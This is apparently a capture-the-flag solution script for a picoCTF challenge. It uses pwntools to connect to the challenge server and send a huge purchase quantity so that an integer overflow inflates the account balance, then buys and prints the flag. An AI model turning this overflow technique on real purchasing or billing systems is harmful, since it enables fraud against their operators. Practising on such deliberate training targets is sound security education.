from pwn import *
context.log_level = 'error'

sh = remote('jupiter.challenges.picoctf.org', 56834)
sh.sendline("2")# choose to buy flags
sh.sendline("1")# choose to buy knock off flags
sh.sendline("100000000000")# quantity of flags to buy
sh.sendline("2")# choose to buy flags
sh.sendline("2")# choose to buy 1337 flags
sh.sendline("1")# confirm
flag = sh.recvuntil('}') .decode('UTF-8').split(' ')[-1] #receive until the end of flag
print(flag)
